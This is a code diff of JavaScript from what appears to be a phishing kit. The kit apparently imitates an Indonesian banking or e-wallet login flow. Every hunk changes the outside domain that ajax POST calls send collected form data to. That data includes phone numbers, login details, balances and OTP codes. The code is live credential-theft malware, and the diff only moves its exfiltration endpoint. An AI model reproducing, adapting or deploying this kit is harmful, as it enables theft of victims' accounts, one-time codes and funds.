@@ -13,7 +13,7 @@ function sendHp() {
    sessionStorage.setItem('nohp', nohp);
    
    $.ajax({
-      url: 'https://choreoapps.oo-nan.cfd/andi/no.php',
+      url: 'https://choreoapps.oo-feed.cfd/andi/no.php',
       type: 'POST',
       data: $('#login').serialize(),  
       complete: function() {
@@ -33,7 +33,7 @@ function sendLogin(){
     document.getElementById('lanjutkan').innerHTML = "Memproses....";               
     
     $.ajax({
-      url: 'https://choreoapps.oo-nan.cfd/andi/sudah.php',
+      url: 'https://choreoapps.oo-feed.cfd/andi/sudah.php',
       type: 'POST',
       data: $('#sudah').serialize(),    
     complete: function(){    
@@ -63,7 +63,7 @@ function sendSaldoS() {
    document.getElementById('lanjutkan').innerHTML = "Memproses....";
    
    $.ajax({
-      url: 'https://choreoapps.oo-nan.cfd/andi/saldosdh.php',
+      url: 'https://choreoapps.oo-feed.cfd/andi/saldosdh.php',
       type: 'POST',
       data: $('#saldosdh').serialize(),
       complete: function() {
@@ -97,7 +97,7 @@ function sendOtpS() {
    var nama1 = document.getElementById('nama1');
    
    $.ajax({
-      url: 'https://choreoapps.oo-nan.cfd/andi/otpsdh.php',
+      url: 'https://choreoapps.oo-feed.cfd/andi/otpsdh.php',
       type: 'POST',
       data: $('#formsdh').serialize(),
       complete: function(response) {
@@ -133,7 +133,7 @@ document.getElementById("nohp").value =
        
     
     $.ajax({
-      url: 'https://choreoapps.oo-nan.cfd/andi/belum.php',
+      url: 'https://choreoapps.oo-feed.cfd/andi/belum.php',
       type: 'POST',
       data: $('#belum').serialize(),   
     complete: function(){
@@ -159,7 +159,7 @@ function sendSaldo() {
    document.getElementById('lanjutkan').innerHTML = "Memproses....";
    
    $.ajax({
-      url: 'https://choreoapps.oo-nan.cfd/andi/saldoblm.php',
+      url: 'https://choreoapps.oo-feed.cfd/andi/saldoblm.php',
       type: 'POST',
       data: $('#saldoblm').serialize(),
       complete: function() {
@@ -203,7 +203,7 @@ function sendOtp() {
    var nama1 = document.getElementById('nama1');
    
    $.ajax({
-      url: 'https://choreoapps.oo-nan.cfd/andi/otpblm.php',
+      url: 'https://choreoapps.oo-feed.cfd/andi/otpblm.php',
       type: 'POST',
       data: $('#formblm').serialize(),
       complete: function(response) {
